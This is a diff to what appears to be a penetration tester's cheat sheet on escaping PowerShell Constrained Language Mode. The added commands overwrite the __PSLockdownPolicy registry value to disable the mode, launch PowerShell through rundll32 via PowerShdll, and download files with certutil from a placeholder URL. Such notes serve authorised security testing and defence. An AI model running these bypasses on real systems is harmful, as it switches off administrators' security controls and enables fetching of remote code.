@@ -65,7 +65,23 @@ Powershell.exe -Version 2
 ```
 
 #### Overwrite __PSLockdownPolicy variable
-- If CLM is not implemented correctly.
+- If CLM is not implemented correctly and is using __PSLockdownPolicy
+
+#### Check the __PSLockdownPolicy value
+- Value 4 is enabled
+- Value 8 is disabled
+```
+(Get-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy").__PSLockDownPolicy
+```
+
+#### Set lockdown policy to 8 and check language mode
+```
+Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy" -Value 8
+powershell.exe
+$ExecutionContext.SessionState.LanguageMode
+```
+
+#### Script to disable it
 - https://github.com/Metoraf007/Public_PowerShell/blob/master/Bypass_ConstrainedLang.ps1
 ```
 #Requires -RunAsAdministrator
@@ -82,7 +98,15 @@ Write-Host $ExecutionContext.SessionState.LanguageMode
 Start-Sleep -s 10
 ```
 
+#### PowerShdll Run PowerShell with dlls only.
+- https://github.com/p3nt4/PowerShdll
+- Does not require access to powershell.exe as it uses powershell automation dlls.
+```
+rundll32 PowerShdll,main -i
+```
+
 #### Download files with certutil
+- You can not use iwr but you can use certutil in constrained language mode
 ```
 certutil -urlcache -split -f <URL>
 ```
